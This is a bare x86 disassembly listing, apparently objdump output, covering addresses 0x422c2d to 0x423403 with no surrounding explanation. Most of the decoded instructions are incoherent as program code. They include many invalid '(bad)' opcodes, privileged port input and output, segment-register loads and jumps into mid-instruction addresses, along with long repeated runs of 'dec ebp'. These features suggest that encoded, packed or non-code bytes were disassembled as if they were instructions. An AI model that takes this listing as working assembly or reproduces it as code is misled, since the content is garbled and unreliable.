  422c2d:	lock lea eax,[esi-0x7272f3a0]
  422c34:	cmp    ch,0xb2
  422c37:	mov    bh,ch
  422c39:	in     eax,dx
  422c3a:	mov    edx,0xfa05633a
  422c3f:	lea    edi,[edx]
  422c41:	lea    ecx,[ebp-0x39c5e29]
  422c47:	in     al,0x9c
  422c49:	les    esp,FWORD PTR [edi]
  422c4b:	add    bh,0xaf
  422c4e:	xchg   cl,ch
  422c50:	or     al,0x8d
  422c52:	(bad)  
  422c53:	loop   0x422c8f
  422c55:	scas   al,BYTE PTR es:[edi]
  422c56:	in     al,dx
  422c57:	sti    
  422c58:	in     al,dx
  422c59:	ret    0x86ed
  422c5c:	cmp    ch,ch
  422c5e:	mov    BYTE PTR [edx],bh
  422c60:	sub    BYTE PTR [edx+0x63],0xfc
  422c64:	sub    BYTE PTR [edx-0x1c],0xb4
  422c68:	scas   al,BYTE PTR es:[edi]
  422c69:	fsubr  st,st(5)
  422c6b:	test   DWORD PTR [edi],ebp
  422c6d:	fiadd  DWORD PTR [eax-0x27f61b02]
  422c73:	in     eax,dx
  422c74:	test   edi,edi
  422c76:	fimul  DWORD PTR [esi-0x1b8ff212]
  422c7c:	out    dx,al
  422c7d:	mov    cs,WORD PTR [ebp+ecx*1-0x5549bc90]
  422c84:	(bad)  
  422c85:	leave  
  422c86:	bound  esi,QWORD PTR [edx-0x367902f3]
  422c8c:	or     al,0x8d
  422c8e:	(bad)  
  422c8f:	xlat   BYTE PTR ds:[ebx]
  422c90:	adc    eax,0x9faeab9d
  422c95:	scas   al,BYTE PTR es:[edi]
  422c96:	lahf   
  422c97:	dec    ebp
  422c98:	push   ebp
  422c99:	xor    eax,0xb5f1aa96
  422c9e:	outs   dx,DWORD PTR ds:[esi]
  422c9f:	lea    ecx,[ebp-0x2c3b7272]
  422ca5:	bound  edx,QWORD PTR [ecx-0x7e7902f3]
  422cab:	or     al,0x8d
  422cad:	(bad)  
  422cae:	xlat   BYTE PTR ds:[ebx]
  422caf:	dec    ecx
  422cb0:	bound  eax,QWORD PTR ds:0x1786fd0d
  422cb6:	or     al,0x8d
  422cb8:	(bad)  
  422cb9:	xlat   BYTE PTR ds:[ebx]
  422cba:	xchg   ebx,eax
  422cbb:	popf   
  422cbc:	mov    WORD PTR gs:[edx+0x30],fs
  422cc0:	in     al,0xc
  422cc2:	(bad)  
  422cc3:	dec    DWORD PTR [edx]
  422cc5:	adc    bh,0x8a
  422cc8:	inc    ebx
  422cc9:	xlat   BYTE PTR ds:[ebx]
  422cca:	and    DWORD PTR [ebx-0x29],0x35
  422cce:	or     edx,ebp
  422cd0:	mov    dh,0x3a
  422cd2:	lea    ecx,[ebp-0x75187fba]
  422cd8:	cmc    
  422cd9:	mov    esi,0x8d8d3adc
  422cde:	bound  eax,QWORD PTR [edx-0x72c5347a]
  422ce4:	lea    eax,[eax+0x23d582d7]
  422cea:	(bad)  
  422ceb:	stc    
  422cec:	xchg   BYTE PTR [eax],cl
  422cee:	cmp    cl,BYTE PTR [ebp+0x7ad7808d]
  422cf4:	aad    0x30
  422cf6:	adc    bh,0xf7
  422cf9:	xor    al,0x7a
  422cfc:	push   eax
  422cfd:	lock test DWORD PTR [eax-0xfaf7d10],0x83f0807a
  422d08:	push   eax
  422d09:	lock adc BYTE PTR [eax-0x29],0x83
  422d0e:	popf   
  422d0f:	stos   DWORD PTR es:[edi],eax
  422d10:	lahf   
  422d11:	icebp  
  422d12:	mov    ebp,0x8e8d8da6
  422d17:	out    dx,eax
  422d18:	in     al,dx
  422d19:	pushf  
  422d1a:	stos   BYTE PTR es:[edi],al
  422d1b:	fwait
  422d1c:	mov    WORD PTR gs:[edi-0x11f31b4e],cs
  422d23:	in     al,dx
  422d24:	or     al,BYTE PTR [eax-0x5795039]
  422d2a:	cmp    cl,BYTE PTR [ebp-0x7fea2873]
  422d30:	ja     0x422cb8
  422d32:	and    bh,0xaf
  422d35:	mov    dl,0x84
  422d37:	in     al,dx
  422d38:	inc    ebx
  422d39:	jo     0x422d1d
  422d3b:	out    dx,eax
  422d3c:	test   eax,0xee7be501
  422d41:	les    edx,FWORD PTR [edi-0x80]
  422d44:	(bad)  
  422d45:	scas   eax,DWORD PTR es:[edi]
  422d46:	in     eax,dx
  422d47:	js     0x422d55
  422d49:	xchg   BYTE PTR [eax],ch
  422d4b:	cmp    cl,BYTE PTR [ebp-0x7fe22873]
  422d51:	ja     0x422cd9
  422d53:	and    bh,0xaf
  422d56:	mov    dl,0x84
  422d58:	in     al,dx
  422d59:	loop   0x422d4a
  422d5b:	lahf   
  422d5c:	loop   0x422d4d
  422d5e:	test   eax,0xee7b6601
  422d63:	cmp    cl,BYTE PTR [ebp+0x6c71c48d]
  422d69:	out    dx,al
  422d6a:	or     al,0x8d
  422d6c:	(bad)  
  422d6d:	in     al,dx
  422d6e:	out    0xaf,eax
  422d70:	loop   0x422de3
  422d72:	lahf   
  422d73:	cli    
  422d74:	lea    edi,[edx]
  422d76:	lea    ecx,[ebp+0x43f9f050]
  422d7c:	push   0x6d
  422d7e:	and    BYTE PTR [ecx-0x7a],0xbd
  422d82:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422d88:	push   ecx
  422d89:	in     al,0xc6
  422d8b:	cmp    dh,al
  422d8d:	stc    
  422d8e:	in     eax,dx
  422d8f:	out    0x76,eax
  422d91:	out    dx,al
  422d92:	or     ebp,ebp
  422d94:	bound  ecx,QWORD PTR [ebp+0x77ed8d8d]
  422d9a:	jbe    0x422d28
  422d9c:	xor    al,0xf9
  422d9f:	in     eax,dx
  422da0:	retf   
  422da1:	out    dx,al
  422da2:	in     al,0xec
  422da4:	loop   0x422d92
  422da6:	lahf   
  422da7:	and    bh,0xfd
  422daa:	mov    dl,0xba
  422dac:	outs   dx,DWORD PTR ds:[esi]
  422dad:	inc    ebx
  422dae:	push   0x6d
  422db0:	loop   0x422e1f
  422db2:	test   eax,0xadc96601
  422db7:	in     al,dx
  422db8:	lea    ecx,[ebp+0x45866180]
  422dbe:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422dc4:	push   ecx
  422dc5:	in     al,0xc6
  422dc7:	push   eax
  422dc8:	lock xchg BYTE PTR [eax-0x10],dl
  422dcc:	sub    ebp,0xffffffcb
  422dcf:	out    dx,al
  422dd0:	in     al,0xd3
  422dd2:	add    BYTE PTR ds:0x3a83b7ed,0xb6
  422dd9:	mov    ch,ch
  422ddb:	lock or DWORD PTR [ecx+esi*4],0xffffffed
  422de0:	retf   
  422de1:	mov    eax,ds:0x225e1fd3
  422de6:	or     al,0x8d
  422de8:	lea    eax,[ebx-0x4e]
  422deb:	adc    BYTE PTR [ecx+0x72],0xb7
  422def:	sub    esp,0x77
  422df2:	xor    DWORD PTR [esi-0x288137c],0x50
  422df9:	ja     0x422daa
  422dfb:	les    eax,FWORD PTR [edi-0x13]
  422dfe:	mov    dh,ch
  422e00:	xchg   BYTE PTR [eax],bh
  422e02:	lea    ecx,[ebp-0x493b4973]
  422e08:	mov    bh,0x83
  422e0a:	pop    edi
  422e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e0c:	test   ah,ah
  422e0e:	outs   dx,DWORD PTR ds:[esi]
  422e0f:	dec    ebp
  422e10:	ja     0x422d95
  422e12:	aas    
  422e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e14:	test   BYTE PTR [ecx+0x755e86d7],dh
  422e1a:	outs   dx,DWORD PTR ds:[esi]
  422e1b:	lea    ecx,[ebp+0x50fd77ec]
  422e21:	ja     0x422dd2
  422e23:	mov    dl,0xb7
  422e25:	sub    esi,0xffffffe2
  422e28:	out    dx,al
  422e29:	test   eax,0x807b4d43
  422e2e:	jl     0x422db0
  422e30:	(bad)  
  422e31:	scas   eax,DWORD PTR es:[edi]
  422e32:	xchg   al,ah
  422e34:	lea    ecx,[ebp-0x2ac5c173]
  422e3a:	in     al,dx
  422e3b:	xor    bh,ah
  422e3d:	xor    DWORD PTR [esi-0x78284e44],0xffffffc4
  422e44:	lea    ecx,[ebp+0x77]
  422e47:	add    DWORD PTR [eax-0x4d120610],0xc
  422e4e:	and    bh,0x8a
  422e51:	cmp    BYTE PTR [ebx+eax*2+0x77],0x35
  422e56:	pop    edi
  422e57:	ja     0x422ddc
  422e59:	fcmovnu st,st(2)
  422e5b:	or     BYTE PTR [ebx+0x43],0xd7
  422e5f:	add    DWORD PTR [eax-0xab9c269],0x63
  422e66:	test   ebx,edx
  422e68:	in     al,dx
  422e69:	jg     0x422e42
  422e6b:	dec    ebx
  422e6c:	push   eax
  422e6d:	out    0x8a,eax
  422e6f:	or     eax,esp
  422e71:	xor    ah,BYTE PTR [ebx-0x19]
  422e74:	cmp    eax,0xccaaea09
  422e79:	dec    ebp
  422e7a:	dec    ebp
  422e7b:	xchg   dl,dl
  422e7d:	lea    ecx,[ebp+0x16a438d]
  422e83:	lds    esi,FWORD PTR ds:0x2d978065
  422e89:	adc    bh,0x8b
  422e8c:	inc    ebx
  422e8d:	xlat   BYTE PTR ds:[ebx]
  422e8e:	sbb    eax,0x9780d450
  422e93:	inc    ebp
  422e94:	and    bh,0x8a
  422e97:	inc    ebx
  422e98:	out    0x35,eax
  422e9a:	push   eax
  422e9b:	(bad)  
  422e9c:	jo     0x422e41
  422e9e:	test   eax,0x8d25fbab
  422ea3:	test   eax,0x6d6a439d
  422ea8:	les    eax,FWORD PTR [edx-0x7272f95e]
  422eae:	lea    edi,[edx]
  422eb0:	in     al,0x3a
  422eb2:	je     0x422e66
  422eb4:	mov    ah,0xef
  422eb6:	cdq    
  422eb7:	adc    bh,0x8b
  422eba:	arpl   di,dx
  422ebc:	and    eax,0x7780f9d3
  422ec1:	test   BYTE PTR [edx+0x5046ef84],dh
  422ec7:	ja     0x422e4d
  422ec9:	push   eax
  422eca:	xlat   BYTE PTR ds:[ebx]
  422ecb:	mov    ebp,DWORD PTR [ecx+0x76f08074]
  422ed1:	or     eax,esp
  422ed3:	push   0xffffffb2
  422ed5:	mov    edx,0x8677ecee
  422eda:	in     al,dx
  422edb:	mov    dl,0xc4
  422edd:	outs   dx,DWORD PTR ds:[esi]
  422ede:	or     eax,esp
  422ee0:	push   0xffffffec
  422ee2:	ja     0x422f5a
  422ee4:	add    bh,0xfd
  422ee7:	add    ebp,eax
  422ee9:	ja     0x422e78
  422eeb:	inc    ebx
  422eec:	push   0x1
  422eee:	lds    esi,FWORD PTR [edi-0x73]
  422ef1:	mov    ds:0x8d8d8d06,al
  422ef6:	cmp    dl,bl
  422ef8:	and    eax,0x5d353180
  422efd:	mov    dl,0xb5
  422eff:	xor    eax,0x3163ef2d
  422f04:	xor    eax,0x8f26d3a5
  422f09:	push   cs
  422f0a:	dec    ebp
  422f0b:	jne    0x422f42
  422f0d:	pop    ebp
  422f0e:	mov    dl,0xb4
  422f10:	out    dx,eax
  422f11:	adc    BYTE PTR [ebp+0x11802d35],dl
  422f17:	or     DWORD PTR [edi+edx*4-0x73],ebx
  422f1b:	mov    dl,0xbe
  422f1d:	dec    DWORD PTR [ecx]
  422f1f:	and    bh,dh
  422f21:	pop    edi
  422f22:	xor    DWORD PTR ds:0x801bd32d,esi
  422f28:	mov    al,ds:0x8def8d60
  422f2d:	lea    eax,[ebx-0x2]
  422f30:	mov    dl,0xbe
  422f32:	das    
  422f33:	mov    ecx,0xec8df03a
  422f38:	push   0x1
  422f3a:	lds    esi,FWORD PTR ds:0x7b2746d
  422f40:	das    
  422f41:	aas    
  422f42:	xor    DWORD PTR ds:0xb9a0432d,esi
  422f48:	aas    
  422f49:	xchg   edi,eax
  422f4a:	(bad)  
  422f4b:	in     al,dx
  422f4c:	push   0xffffffed
  422f4e:	push   0x3a
  422f50:	add    ebp,eax
  422f52:	xor    eax,0x8099746d
  422f57:	sub    al,BYTE PTR [esi+0x4d4d069c]
  422f5d:	sbb    BYTE PTR [eax+eax*4+0x6ffc51],0x86
  422f65:	repnz push es
  422f67:	dec    ebp
  422f68:	dec    ebp
  422f69:	cdq    
  422f6a:	sub    BYTE PTR [edx],0xfc
  422f6d:	jns    0x422f9e
  422f6f:	stos   DWORD PTR es:[edi],eax
  422f70:	xchg   BYTE PTR [ebx-0x66b2b2fa],dh
  422f76:	cld    
  422f77:	jns    0x422fe8
  422f79:	mov    ds:0x4d063986,eax
  422f7e:	dec    ebp
  422f7f:	cld    
  422f80:	jns    0x422f8e
  422f82:	cdq    
  422f83:	cmp    BYTE PTR [esi-0x42],0xc4
  422f87:	test   DWORD PTR [ebp+0x4d],ecx
  422f8a:	xchg   edi,eax
  422f8b:	add    BYTE PTR [edi+0x3a4587a2],0x8d
  422f92:	lea    edi,[edi+esi*2-0x75]
  422f96:	mul    BYTE PTR [edi+ebp*2]
  422f99:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  422f9d:	cmc    
  422f9e:	and    al,0x6f
  422fa0:	cmp    BYTE PTR [eax+0x7750ef77],al
  422fa6:	out    dx,eax
  422fa7:	xor    BYTE PTR [edi-0x75],0x80
  422fab:	xchg   edi,eax
  422fac:	mov    edx,DWORD PTR [ebx+0xde29b99]
  422fb2:	lahf   
  422fb3:	push   ebx
  422fb4:	mov    dh,0xb2
  422fb6:	clc    
  422fb7:	sub    DWORD PTR [edx+eiz*1+0x24],esp
  422fbb:	outs   dx,DWORD PTR ds:[esi]
  422fbc:	cmp    BYTE PTR [ebx+0x74],dl
  422fbf:	mov    dl,0x86
  422fc1:	or     al,0xff
  422fc3:	sti    
  422fc4:	push   eax
  422fc5:	ja     0x42303d
  422fc7:	xor    BYTE PTR [edi-0x75],0x80
  422fcb:	xchg   edi,eax
  422fcc:	mov    edx,DWORD PTR [ebx+0x74]
  422fcf:	mov    dl,0x86
  422fd1:	or     al,0x53
  422fd3:	mov    dh,0xb2
  422fd5:	clc    
  422fd6:	sub    edi,edi
  422fd8:	sti    
  422fd9:	push   eax
  422fda:	ja     0x422f66
  422fdc:	xor    BYTE PTR [edi-0x75],0x80
  422fe0:	xchg   edi,eax
  422fe1:	mov    edx,DWORD PTR [ebx+0x74]
  422fe4:	mov    dl,0x86
  422fe6:	or     al,0x53
  422fe8:	mov    dh,0xb2
  422fea:	clc    
  422feb:	sub    edi,edi
  422fed:	sti    
  422fee:	push   eax
  422fef:	ja     0x423053
  422ff1:	xor    BYTE PTR [edi-0x75],0x80
  422ff5:	xchg   edi,eax
  422ff6:	mov    edx,DWORD PTR [ebx+0x74]
  422ff9:	mov    dl,0x86
  422ffb:	or     al,0x53
  422ffd:	mov    dh,0xb2
  422fff:	clc    
  423000:	sub    edi,edi
  423002:	sti    
  423003:	push   eax
  423004:	ja     0x422f8c
  423006:	jl     0x42307f
  423008:	mul    BYTE PTR cs:[esi+ebp*8]
  42300c:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423010:	mul    BYTE PTR [ebx+0x777c386f]
  423016:	es cli 
  423018:	and    al,0x6f
  42301a:	cmp    dl,ah
  42301c:	cmp    eax,0x6277509d
  423021:	push   eax
  423022:	ja     0x423086
  423024:	loop   0x422fe3
  423026:	popf   
  423027:	push   eax
  423028:	ja     0x42308c
  42302a:	push   eax
  42302b:	ja     0x42308f
  42302d:	jl     0x4230a6
  42302f:	bound  ecx,QWORD PTR [edx]
  423031:	lea    ecx,[ebp+0x62777c8d]
  423037:	jns    0x422fc6
  423039:	lea    ecx,[ebp-0x7f748880]
  42303f:	xchg   edi,eax
  423040:	mov    edx,DWORD PTR [ebx+0x74]
  423043:	push   ebx
  423044:	mov    dh,0xb2
  423046:	xchg   BYTE PTR [edx+esi*4],cl
  423049:	clc    
  42304a:	sub    edi,edi
  42304c:	sti    
  42304d:	push   eax
  42304e:	ja     0x4230b2
  423050:	xor    BYTE PTR [edi-0x75],0x80
  423054:	xchg   edi,eax
  423055:	mov    edx,DWORD PTR [ebx+0x74]
  423058:	push   ebx
  423059:	mov    dh,0xb2
  42305b:	xchg   BYTE PTR [edx+esi*4],cl
  42305e:	clc    
  42305f:	sub    edi,edi
  423061:	sti    
  423062:	push   eax
  423063:	ja     0x4230c7
  423065:	jl     0x4230de
  423067:	jp     0x42300c
  423069:	or     al,0x8d
  42306b:	lea    edi,[edi+esi*2-0x7c]
  42306f:	pop    edi
  423070:	lea    ecx,[ebp-0x50888373]
  423076:	out    0x8d,eax
  423078:	lea    ecx,[ebp+0xdc86801]
  42307e:	dec    ebp
  42307f:	dec    ebp
  423080:	add    DWORD PTR [eax+0x7a],ebx
  423083:	or     eax,0xfe864d4d
  423088:	or     eax,0xf04d4d4d
  42308d:	scas   eax,DWORD PTR es:[edi]
  42308e:	xlat   BYTE PTR ds:[ebx]
  42308f:	pop    es
  423090:	dec    ebp
  423091:	lock test bh,dl
  423094:	add    al,0x4d
  423096:	lock jp 0x423070
  423099:	jb     0x423117
  42309b:	ja     0x423021
  42309d:	mov    eax,ds:0x808d8d6d
  4230a2:	ja     0x42302f
  4230a4:	xor    al,0x8b
  4230a7:	push   ebx
  4230a8:	je     0x42305c
  4230aa:	xchg   BYTE PTR [edx+eiz*8],cl
  4230ad:	or     eax,0xb25153a9
  4230b2:	mov    edx,0x50b2ff29
  4230b7:	ja     0x423123
  4230b9:	xor    BYTE PTR [edi-0x75],0x80
  4230bd:	lock mov ebp,ebp
  4230c0:	mov    bh,0xc8
  4230c2:	lea    edx,[ebx+0x74]
  4230c5:	mov    dl,0x86
  4230c7:	or     al,0x53
  4230c9:	push   ecx
  4230ca:	mov    dl,0xba
  4230cc:	sub    edi,edi
  4230ce:	mov    dl,0x50
  4230d0:	ja     0x42314c
  4230d2:	mov    ch,0x4a
  4230d4:	sbb    eax,0x508d8d8d
  4230d9:	ja     0x4230a3
  4230db:	sub    BYTE PTR [ebp-0x7f],0x50
  4230df:	ja     0x423068
  4230e1:	sub    BYTE PTR [ebp+0x21],0x50
  4230e5:	ja     0x423119
  4230e7:	xor    BYTE PTR [edi-0x11],0x1
  4230eb:	lock enter 0x1050,0x62
  4230f0:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  4230f6:	add    eax,esi
  4230f8:	xchg   DWORD PTR [eax+0x10],edx
  4230fb:	push   esi
  4230fc:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  423102:	dec    ebp
  423103:	xlat   BYTE PTR ds:[ebx]
  423104:	out    dx,eax
  423105:	add    eax,esi
  423107:	xor    dl,BYTE PTR [eax+0x10]
  42310a:	pop    esi
  42310b:	cmp    cl,BYTE PTR [ebp+0x3fba868d]
  423111:	lea    ecx,[ebp-0x7f740f80]
  423117:	xchg   edi,eax
  423118:	mov    edx,DWORD PTR [ebx+0x11]
  42311b:	push   ebx
  42311c:	jle    0x4230d0
  42311e:	mov    esi,0x29f8b20c
  423123:	(bad)  
  423124:	(bad)  
  423125:	arpl   bp,di
  423127:	or     DWORD PTR [edi],ecx
  423129:	(bad)  
  42312a:	in     al,dx
  42312b:	lea    ecx,[ebp-0x7f108880]
  423131:	int    0x36
  423133:	cmp    cl,BYTE PTR [ebp-0x7f107f73]
  423139:	ja     0x42312a
  42313b:	or     ch,0x36
  42313e:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  423144:	xchg   edx,eax
  423145:	gs xor al,0xef
  423149:	adc    BYTE PTR [eax+0x32],0x3a
  42314d:	lea    ecx,[ebp+0x4d151801]
  423153:	dec    ebp
  423154:	dec    ebp
  423155:	stos   BYTE PTR es:[edi],al
  423156:	adc    BYTE PTR [edi+0x26d180ef],0x3a
  42315d:	lea    ecx,[ebp+0x5aec9080]
  423163:	adc    BYTE PTR [ebp-0x111d7273],cl
  423169:	dec    ebp
  42316a:	bound  eax,QWORD PTR [ecx-0x73]
  42316d:	lea    ecx,[ebp+0x25964daa]
  423173:	push   ebx
  423174:	push   0x7c
  423176:	dec    edi
  423177:	push   ebp
  423178:	dec    ebp
  423179:	dec    ebp
  42317a:	dec    ebp
  42317b:	outs   dx,BYTE PTR ds:[esi]
  42317c:	mov    ds:0x4f7c0a43,eax
  423181:	pop    ebp
  423182:	dec    ebp
  423183:	dec    ebp
  423184:	dec    ebp
  423185:	jg     0x423135
  423187:	push   ebp
  423188:	fwait
  423189:	jl     0x4231da
  42318b:	gs dec ebp
  42318d:	dec    ebp
  42318e:	dec    ebp
  42318f:	stos   DWORD PTR es:[edi],eax
  423190:	lock scas al,BYTE PTR es:[edi]
  423192:	aas    
  423193:	cld    
  423194:	dec    edi
  423195:	ins    DWORD PTR es:[edi],dx
  423196:	dec    ebp
  423197:	dec    ebp
  423198:	dec    ebp
  423199:	xchg   BYTE PTR [ecx],al
  42319b:	push   0x4d4d4d92
  4231a0:	inc    esp
  4231a1:	mov    ecx,0x6a53f544
  4231a6:	jl     0x4231f7
  4231a8:	sub    eax,0x6e4d4d4d
  4231ad:	mov    ds:0x4f7c0a43,eax
  4231b2:	xor    eax,0x7f4d4d4d
  4231b7:	scas   al,BYTE PTR es:[edi]
  4231b8:	push   ebp
  4231b9:	fwait
  4231ba:	jl     0x42320b
  4231bc:	cmp    eax,0xab4d4d4d
  4231c1:	lock scas al,BYTE PTR es:[edi]
  4231c3:	imul   edi,esp,0x4f
  4231c6:	inc    ebp
  4231c7:	dec    ebp
  4231c8:	dec    ebp
  4231c9:	dec    ebp
  4231ca:	xchg   BYTE PTR [ecx],al
  4231cc:	push   0x4d4d4d47
  4231d1:	inc    esp
  4231d2:	mov    ecx,0x7780f544
  4231d7:	out    dx,eax
  4231d8:	or     ch,0x32
  4231db:	cmp    cl,BYTE PTR [ebp-0x10187f73]
  4231e1:	in     eax,dx
  4231e2:	push   0x71
  4231e4:	push   eax
  4231e5:	ja     0x42321d
  4231e7:	xor    BYTE PTR [edi-0x11],0x80
  4231eb:	int    0xfd
  4231ed:	cmp    cl,BYTE PTR [ebp-0x32888373]
  4231f3:	xchg   ebp,eax
  4231f4:	mov    ds:0x777caea5,eax
  4231f9:	lldt   WORD PTR [edi+0x7cb9969d]
  423200:	ja     0x423212
  423202:	aas    
  423203:	xchg   BYTE PTR [edi+ecx*2-0x3b],bh
  423207:	dec    ebp
  423208:	dec    ebp
  423209:	dec    ebp
  42320a:	outs   dx,BYTE PTR ds:[esi]
  42320b:	mov    ds:0x4f7c0a43,eax
  423210:	push   edx
  423211:	dec    ebp
  423212:	dec    ebp
  423213:	dec    ebp
  423214:	jg     0x4231c4
  423216:	aas    
  423217:	xchg   ebp,eax
  423218:	jl     0x423269
  42321a:	aad    0x4d
  42321c:	dec    ebp
  42321d:	dec    ebp
  42321e:	popf   
  42321f:	or     bh,BYTE PTR [edi+0x59]
  423222:	jl     0x423273
  423224:	fisttp QWORD PTR [ebp+0x4d]
  423227:	dec    ebp
  423228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423229:	xchg   edi,eax
  42322a:	lock scas al,BYTE PTR es:[edi]
  42322c:	jl     0x42327d
  42322e:	in     eax,0x4d
  423230:	dec    ebp
  423231:	dec    ebp
  423232:	xchg   esi,eax
  423233:	add    BYTE PTR [edi],bh
  423235:	xchg   BYTE PTR [edi+ecx*2-0x63],bh
  423239:	dec    ebp
  42323a:	dec    ebp
  42323b:	dec    ebp
  42323c:	outs   dx,BYTE PTR ds:[esi]
  42323d:	mov    ds:0x4f7c0a43,eax
  423242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423243:	dec    ebp
  423244:	dec    ebp
  423245:	dec    ebp
  423246:	jg     0x4231f6
  423248:	aas    
  423249:	xchg   ebp,eax
  42324a:	jl     0x42329b
  42324c:	lods   eax,DWORD PTR ds:[esi]
  42324d:	dec    ebp
  42324e:	dec    ebp
  42324f:	dec    ebp
  423250:	popf   
  423251:	or     bh,BYTE PTR [edi+0x59]
  423254:	jl     0x4232a5
  423256:	mov    ch,0x4d
  423258:	dec    ebp
  423259:	dec    ebp
  42325a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42325b:	xchg   edi,eax
  42325c:	lock scas al,BYTE PTR es:[edi]
  42325e:	jl     0x4232af
  423260:	mov    ebp,0x964d4d4d
  423265:	add    BYTE PTR [ebx-0x7a],ch
  423268:	xchg   BYTE PTR [edx+0x3d],ah
  42326b:	lea    ecx,[ebp+0x3677800a]
  423271:	dec    ebp
  423272:	jno    0x4231f4
  423274:	ja     0x423201
  423276:	xor    al,0x8b
  423279:	push   ebx
  42327a:	je     0x4232cf
  42327c:	push   ecx
  42327d:	mov    dl,0xba
  42327f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423285:	xor    al,0x84
  423288:	arpl   WORD PTR [edx+0x3aca0f09],si
  42328e:	lea    ecx,[ebp-0x7f068880]
  423294:	lock stc 
  423296:	push   ebx
  423297:	je     0x4232ec
  423299:	push   ecx
  42329a:	mov    dl,0xba
  42329c:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4232a2:	xor    al,0x84
  4232a5:	inc    ebx
  4232a6:	std    
  4232a7:	xor    BYTE PTR [edi+0x6a],0x63
  4232ab:	mov    dl,0x9
  4232ad:	into   
  4232ae:	xchg   esp,eax
  4232af:	cmp    cl,BYTE PTR [ebp+0x3e777c8d]
  4232b5:	lea    ecx,[ebp+0x77808d8d]
  4232bb:	out    dx,eax
  4232bc:	and    BYTE PTR [edx+0x32],0x3a
  4232c0:	lea    ecx,[ebp-0x7f101880]
  4232c6:	ja     0x4232b7
  4232c8:	or     ch,0x76
  4232cb:	cmp    cl,BYTE PTR [ebp+0x3dda868d]
  4232d1:	lea    ecx,[ebp+0x71994d0a]
  4232d7:	xor    al,0xef
  4232da:	adc    BYTE PTR [eax+0x46],0x3a
  4232de:	lea    ecx,[ebp+0x77803a50]
  4232e4:	out    dx,eax
  4232e5:	sbb    BYTE PTR [esi+0x32],0x3a
  4232e9:	lea    ecx,[ebp+0x53efd780]
  4232ef:	push   0x1
  4232f1:	sbb    BYTE PTR [ebp-0x79b2b2b3],bl
  4232f7:	fwait
  4232f8:	cmp    eax,0x800a8d8d
  4232fd:	ja     0x4232ee
  4232ff:	or     ch,0x46
  423302:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423308:	fwait
  423309:	out    dx,eax
  42330a:	push   eax
  42330b:	ja     0x423323
  42330d:	xor    BYTE PTR [edi-0x11],0x80
  423311:	pop    esi
  423312:	xor    bh,BYTE PTR [edx]
  423314:	lea    ecx,[ebp+0x53efd780]
  42331a:	push   0x1
  42331c:	sbb    ch,al
  42331e:	dec    ebp
  42331f:	dec    ebp
  423320:	dec    ebp
  423321:	xchg   BYTE PTR [ebp+0x3d],al
  423324:	lea    ecx,[ebp-0x10887ff6]
  42332a:	or     ch,0x46
  42332d:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423333:	fwait
  423334:	out    dx,eax
  423335:	xor    BYTE PTR [edi-0x11],0x80
  423339:	pop    esi
  42333a:	xor    bh,BYTE PTR [edx]
  42333c:	lea    ecx,[ebp+0x53efd780]
  423342:	push   0x1
  423344:	sbb    BYTE PTR [ebp+0x4d],dl
  423347:	dec    ebp
  423348:	dec    ebp
  423349:	xchg   dh,ch
  42334b:	cmp    eax,0x800a8d8d
  423350:	ja     0x423341
  423352:	or     ch,0x46
  423355:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  42335b:	fwait
  42335c:	out    dx,eax
  42335d:	in     eax,dx
  42335e:	mov    bh,0x5e
  423360:	lea    edx,[eax+0x77]
  423363:	xor    BYTE PTR ss:[edi+0x5e],0xe2
  423368:	pop    ds
  423369:	push   ebx
  42336a:	jb     0x42330b
  42336c:	dec    ebx
  42336d:	add    eax,0x992fbcd
  423372:	loopne 0x42336f
  423374:	or     cl,BYTE PTR [ebp-0x69]
  423377:	ss dec edi
  423379:	push   0xffffffd7
  42337b:	arpl   WORD PTR [eax-0x7b12a189],ax
  423381:	mov    ebp,gs
  423383:	push   0x6e
  423385:	or     cl,BYTE PTR [ebp-0x69]
  423388:	push   ss
  423389:	dec    edi
  42338a:	push   0xffffffd5
  42338c:	rol    BYTE PTR [eax+0x5e80ef77],cl
  423392:	xor    bh,BYTE PTR [edx]
  423394:	lea    ecx,[ebp+0x53efd780]
  42339a:	push   0x1
  42339c:	xchg   edi,eax
  42339d:	int    0x86
  42339f:	and    bh,BYTE PTR [ebx]
  4233a1:	lea    ecx,[ebp-0x10887ff6]
  4233a7:	or     ch,0x3e
  4233aa:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4233b0:	fwait
  4233b1:	out    dx,eax
  4233b2:	push   eax
  4233b3:	ja     0x423364
  4233b5:	(bad)  
  4233b6:	out    dx,al
  4233b7:	in     eax,dx
  4233b8:	mov    bh,0xaf
  4233ba:	lea    ecx,[ebp+0x77]
  4233bd:	pop    esi
  4233be:	in     eax,dx
  4233bf:	out    0x5e,eax
  4233c1:	sub    eax,0x77802ee4
  4233c6:	stc    
  4233c7:	xor    al,0xf9
  4233ca:	adc    bh,0xef
  4233cd:	loop   0x4233dc
  4233cf:	stos   DWORD PTR es:[edi],eax
  4233d0:	push   ebx
  4233d1:	je     0x423426
  4233d3:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233d9:	sub    edi,edi
  4233db:	mov    dl,0x1
  4233dd:	sbb    al,cl
  4233df:	or     eax,0xc3864d4d
  4233e4:	cmp    ecx,DWORD PTR [ebp+0x77800a8d]
  4233ea:	mov    eax,DWORD PTR [eax-0x287f7410]
  4233f0:	out    dx,eax
  4233f1:	push   ebx
  4233f2:	je     0x423447
  4233f4:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233fa:	sub    edi,edi
  4233fc:	mov    dl,0x1
  4233fe:	sbb    BYTE PTR [edx+0xd],bh
  423401:	dec    ebp
  423402:	dec    ebp
  423403:	xchg   dl,bl
